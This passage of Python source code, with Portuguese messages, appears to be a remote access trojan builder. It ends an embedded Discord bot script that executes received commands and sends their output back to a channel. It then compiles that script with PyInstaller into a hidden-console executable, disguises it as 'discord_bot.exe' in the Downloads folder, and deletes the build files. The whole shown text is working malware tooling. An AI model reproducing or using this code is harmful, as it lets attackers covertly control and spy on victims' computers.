                output = output[:1500] + "\\n...[truncado]"
        except Exception as e:
            output = f"Falha na execução do comando: {{e}}"

        embed = discord.Embed(
            title=f"Saída do Comando - {{local_username}}",
            description=f"```{{output}}```",
            color=discord.Color.blue()
        )
        await message.channel.send(embed=embed)

client.run(TOKEN)
'''

    script_filename = "bot_client.py"
    with open(script_filename, "w", encoding="utf-8") as f:
        f.write(bot_script)

    print(Fore.BLUE + "\nCriando RAT..." + Style.RESET_ALL)
    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--noconfirm", script_filename], check=True)
    except subprocess.CalledProcessError:
        print(Fore.BLUE + "Erro. Certifique-se de que o PyInstaller está instalado corretamente." + Style.RESET_ALL)
        time.sleep(2)
        return

    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    exe_name = "discord_bot.exe"
    dist_path = os.path.join("dist", "bot_client.exe")
    final_path = os.path.join(downloads_path, exe_name)

    try:
        if os.path.exists(dist_path):
            shutil.move(dist_path, final_path)
            print(Fore.BLUE + f"\nRAT salvo em:\n{final_path}" + Style.RESET_ALL)
        else:
            print(Fore.BLUE + f"\nErro: {dist_path} não encontrado" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.BLUE + f"Erro ao mover o arquivo: {e}" + Style.RESET_ALL)

    # Limpeza
    for folder in ["build", "dist", "__pycache__"]:
        if os.path.exists(folder):
            shutil.rmtree(folder, ignore_errors=True)
    for file in [script_filename, "bot_client.spec"]:
        if os.path.exists(file):
            os.remove(file)

    input(Fore.BLUE + "\nPressione Enter para voltar ao menu" + Style.RESET_ALL)
    clear_screen()
    show_tool_options()

if __name__ == "__main__":
    main()